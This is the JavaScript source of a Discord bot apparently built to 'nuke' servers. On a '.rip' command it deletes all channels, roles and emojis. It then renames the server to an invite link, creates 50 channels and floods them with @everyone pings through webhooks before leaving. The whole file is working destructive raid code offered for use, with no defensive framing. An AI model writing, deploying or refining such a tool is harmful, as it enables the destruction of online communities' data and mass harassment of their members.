// ====== LIBRARIES ======
const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');
const dotenv = require('dotenv');

dotenv.config();

// ====== DISCORD BOT SETUP ======
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildWebhooks,
    GatewayIntentBits.GuildEmojisAndStickers
  ]
});

// ====== WEB SERVER FOR PORT 3000 ======
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Nebula Bot is online and awaiting .rip command...');
});

app.listen(PORT, () => {
  console.log(`🌐 Web server running on http://localhost:${PORT}`);
});

// ====== COOLDOWN LOGIC ======
const cooldowns = new Map(); // userId -> timestamp
const cooldownDuration = 10 * 60 * 1000; // 10 minutes in ms

// ====== BOT LOGIC ======
client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
  if (message.content === '.rip' && !message.author.bot) {
    const authorId = message.author.id;
    const guild = message.guild;
    const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
    let pingCount = 0;
    const maxPings = 1000;

    // Cooldown check
    if (cooldowns.has(authorId)) {
      const expirationTime = cooldowns.get(authorId) + cooldownDuration;
      if (Date.now() < expirationTime) return;
    }
    cooldowns.set(authorId, Date.now());

    // Delete all channels
    guild.channels.cache.forEach(async (channel) => {
      try {
        await channel.delete();
      } catch {}
    });

    await new Promise(r => setTimeout(r, 1000));

    // Delete all roles
    guild.roles.cache.forEach(async (role) => {
      if (role.name !== '@everyone' && !role.managed) {
        try {
          await role.delete();
        } catch {}
      }
    });

    // Delete all emojis
    guild.emojis.cache.forEach(async (emoji) => {
      try {
        await emoji.delete();
      } catch {}
    });

    // Rename server
    try {
      await guild.edit({ name: 'discord.gg/migh' });
    } catch {}

    // Create 50 channels
    let createdChannels = [];
    for (let i = 0; i < 50; i++) {
      try {
        const channel = await guild.channels.create({ name: 'neb-was-here' });
        createdChannels.push(channel);
      } catch {}
    }

    // Spam logic
    const spamPromises = [];

    for (const channel of createdChannels) {
      if (pingCount >= maxPings) break;

      // Attempt to create webhook
      try {
        const webhook = await channel.createWebhook({
          name: 'Nebula',
          avatar: 'https://i.imgur.com/6QbX6yA.png '
        });

        const spamLimit = Math.min(20, maxPings - pingCount);

        for (let i = 0; i < spamLimit; i++) {
          spamPromises.push(
            webhook.send(spamMessage).catch(async () => {
              try {
                await channel.send(spamMessage);
                pingCount++;
              } catch {}
            })
          );
          pingCount++;
        }
      } catch {
        // Fallback to direct send if webhook creation failed
        const spamLimit = Math.min(20, maxPings - pingCount);
        for (let i = 0; i < spamLimit; i++) {
          spamPromises.push(
            channel.send(spamMessage).catch(() => {})
          );
          pingCount++;
        }
      }
    }

    // Run all spam tasks concurrently
    await Promise.all(spamPromises);

    // Leave server
    try {
      await guild.leave();
    } catch {}

    // Optional: destroy client session
    client.destroy();
  }
});

// ====== LOGIN ======
client.login(process.env.TOKEN);